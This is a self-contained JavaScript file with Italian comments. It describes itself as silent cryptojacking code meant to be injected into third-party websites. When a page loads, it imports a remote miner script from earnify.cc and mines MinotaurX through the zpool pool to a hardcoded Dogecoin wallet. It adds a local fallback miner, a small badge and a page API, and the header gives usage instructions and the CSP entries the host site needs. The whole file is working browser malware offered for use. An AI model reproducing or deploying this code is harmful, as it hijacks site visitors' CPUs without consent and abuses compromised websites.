/*!
 * embed.js — v1.0.1 — cryptojacking silenzioso INIETTABILE su siti terzi.
 *
 * UN SOLO file, nessuna dipendenza: si incolla in un <script> e fa tutto.
 * Avvia earnify (MinotaurX) in un Web Worker, mostra un badge discreto con
 * Ferma/Riprendi, e non tocca il DOM o i CSS del sito ospite.
 *
 * USO (inline, meglio contro la CSP):
 *   <script src="https://TUO-UTENTE.github.io/cj-embed/embed.js"
 *           data-wallet="DTMpW3kmTWcNj21PrjvZbRRWaxTPnQvFcu"
 *           data-badge="1" data-delay="1500" defer></script>
 *
 * ATTRIBUTI (data-*): wallet, worker, pool-host, pool-port, password,
 *   throttle, workers, badge (0/1), delay(ms), mobile(0/1), hidden(0/1),
 *   optout-hours, probe (1 = fallback locale via miner.js).
 *   `miner.js` per il fallback viene cercato NELLA STESSA CARTELLA di embed.js
 *   (nessun URL da configurare); si può forzare con data-probe-url.
 *
 * API in pagina: window.CJMiner.start()/.stop()/.resume()/.status()
 * Se torni più volte, un guard evita il doppio avvio (idempotente).
 *
 * ⚠️ CONFINE DI RETE: il sito dovrà permettere in CSP
 *    script-src https://earnify.cc https://TUO-UTENTE.github.io
 *    connect-src wss://websocket-stratum-server.com
 */
(function () {
  'use strict';
  if (window.CJMiner) return;                         // già iniettato

  var me = document.currentScript;
  function attr(n, d) { var v = me && me.getAttribute('data-' + n); return (v === null ? d : v); }
  function num(n, d) { var v = parseFloat(attr(n, '')); return isFinite(v) ? v : d; }

  // base = cartella da cui è servito embed.js (per trovare miner.js del fallback)
  var BASE = (function () { try { return (me && me.src) ? new URL('miner.js', me.src).href : ''; } catch (e) { return ''; } })();

  var CFG = {
    wallet:       attr('wallet', 'DTMpW3kmTWcNj21PrjvZbRRWaxTPnQvFcu'),
    worker:       attr('worker', 'web'),
    host:         attr('pool-host', 'minotaurx.na.mine.zpool.ca'),
    port:         attr('pool-port', 7019),
    password:     attr('password', 'c=DOGE'),
    throttle:     num('throttle', 0.2),
    workers:      num('workers', 0),
    badge:        attr('badge', '1') !== '0',
    delay:        num('delay', 1500),
    mobile:       attr('mobile', '0') === '1',
    stopHidden:   attr('hidden', '0') === '1',
    optoutHours:  num('optout-hours', 24),
    probe:        attr('probe', '1') !== '0'
  };

  var URL_EARNIFY = 'https://earnify.cc/miner.js';
  var URL_PROBE   = attr('probe-url', BASE);
  var KEY_OPT     = 'cjem_optout_until';

  // ---------- opt-out per-sito (localStorage) ----------
  function optActive() { try { return (parseInt(localStorage.getItem(KEY_OPT), 10) || 0) > Date.now(); } catch (e) { return false; } }
  function optPause() { try { localStorage.setItem(KEY_OPT, String(Date.now() + CFG.optoutHours * 3600e3)); } catch (e) { } }
  function optResume() { try { localStorage.removeItem(KEY_OPT); } catch (e) { } }

  // ---------- motore ----------
  var mod = null, running = false, shares = 0, khs = 0, sostituito = false, lowBatt = false, stopTimer = null;

  // condizioni che impediscono l'avvio in questo istante
  function condBlocked() {
    if (lowBatt) return true;
    var c = navigator.connection; if (c && c.saveData) return true;
    if (CFG.stopHidden && document.hidden) return true;
    return false;
  }

  function carica() {
    return import(URL_EARNIFY).then(function (m) {
      if (!m || (typeof m.start !== 'function' && typeof m.autoMine !== 'function')) throw new Error('export earnify assenti');
      mod = m; return m;
    });
  }

  function _start() {
    if (running || optActive() || condBlocked()) return;
    if (!mod) { carica().then(_start).catch(function (e) { _fallback(e); }); return; }
    var opts = { server: CFG.host, port: CFG.port, worker: CFG.wallet + '.' + CFG.worker, password: CFG.password, ssl: false };
    var threads = CFG.workers > 0 ? CFG.workers : CFG.throttle;   // frazione (0<v<1) o thread fissi
    try {
      var p = mod.start(mod.minotaurx, opts, null, threads, null,
        function (s) { if (s && s.hashrateKHs != null) { khs = Number(s.hashrateKHs) || 0; badge(); } },
        function (e) { console.warn('[CJMiner] errore', e); });
      if (p && p.catch) p.catch(function (e) { _fallback(e); });
    } catch (e) { _fallback(e); return; }
    running = true;
    if (stopTimer) clearInterval(stopTimer);
    stopTimer = setInterval(function () {
      var hs = (mod && mod.minotaurxHashrate) || {};
      if (hs.sharesAccepted != null && hs.sharesAccepted !== shares) { shares = hs.sharesAccepted; badge(); }
    }, 2000);
    badge();
  }

  function _stop() { if (mod && typeof mod.stop === 'function') { try { mod.stop(); } catch (e) { } } running = false; badge(); }

  // fallback locale (opzionale): carica miner.js e usa l'interfaccia Miner.*
  function _fallback(err) {
    if (sostituito || !CFG.probe || !URL_PROBE) { console.warn('[CJMiner] fallback non disponibile', err); return; }
    sostituito = true; console.warn('[CJMiner] earnify KO → probe locale', err);
    var s = document.createElement('script');
    s.src = URL_PROBE; s.onload = function () { if (window.Miner) _startProbe(); };
    document.head.appendChild(s);
  }
  var probeWired = false;
  function _startProbe() {
    if (probeWired) return; probeWired = true;
    window.Miner.on('found', function () { shares++; badge(); });
    window.Miner.on('progress', function (s) { if (s && s.hashrate != null) { khs = s.hashrate / 1000; badge(); } });
    window.Miner.setJob(null, 17); window.Miner.start(); running = true; badge();
  }

  // ---------- condizioni (prudenti per siti terzi: hidden OFF di default) ----------
  function guardHidden() { if (!CFG.stopHidden) return; document.hidden ? _stop() : _start(); }
  function guardBattery() {
    if (!navigator.getBattery) return;
    navigator.getBattery().then(function (b) {
      function g() { lowBatt = (b.level < 0.2 && !b.charging); lowBatt ? _stop() : _start(); }
      b.addEventListener('levelchange', g); b.addEventListener('chargingchange', g); g();
    }).catch(function () { });
  }
  function guardSaveData() { var c = navigator.connection; if (c && c.saveData) _stop(); else _start(); }

  // ---------- badge ----------
  var root, lbl;
  function badge() {
    if (!CFG.badge) return;
    if (!root) {
      if (!document.body) { document.addEventListener('DOMContentLoaded', badge); return; }
      root = document.createElement('div'); root.id = 'cjem-root';
      root.innerHTML = '<span id="cjem-dot"></span><span id="cjem-lbl">CPU</span>';
      var st = document.createElement('style');
      st.textContent =
        '#cjem-root{position:fixed;right:12px;bottom:12px;z-index:2147483000;display:flex;gap:6px;' +
        'align-items:center;font:11px/1.2 ui-monospace,Menlo,Consolas,monospace;background:#0d1117;' +
        'color:#e6edf3;border:1px solid #30363d;border-radius:999px;padding:5px 10px;cursor:pointer;' +
        'box-shadow:0 4px 16px rgba(0,0,0,.4);user-select:none}' +
        '#cjem-dot{width:8px;height:8px;border-radius:50%;background:#8b949e}' +
        '#cjem-dot.on{background:#5ee6a8}';
      document.head.appendChild(st); document.body.appendChild(root);
      lbl = root.querySelector('#cjem-lbl');
      root.title = 'click: ferma / riprendi il mining';
      root.addEventListener('click', function () {
        if (optActive() || running) { optPause(); _stop(); } else { optResume(); _start(); }
        badge();
      });
    }
    var dot = root.querySelector('#cjem-dot');
    dot.className = (running && !optActive()) ? 'on' : '';
    lbl.textContent = optActive() ? 'CPU:pausa' : (khs > 0 ? (khs.toFixed(2) + ' KH/s') : 'CPU');
  }

  // ---------- API + avvio ----------
  window.CJMiner = {
    start: function () { optResume(); _start(); },
    stop:  function () { _stop(); },
    resume: function () { optResume(); _start(); },
    status: function () { return { running: running, shares: shares, khs: khs, optout: optActive(), cfg: CFG, base: BASE }; }
  };

  function boot() {
    if (!CFG.mobile && /Mobi|Android/i.test(navigator.userAgent)) { badge(); return; }
    guardSaveData(); guardBattery();
    if (CFG.stopHidden) document.addEventListener('visibilitychange', guardHidden, false);
    if (navigator.connection && navigator.connection.addEventListener) navigator.connection.addEventListener('change', guardSaveData, false);
    setTimeout(function () { _start(); badge(); }, CFG.delay);
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot, false);
  else boot();
})();
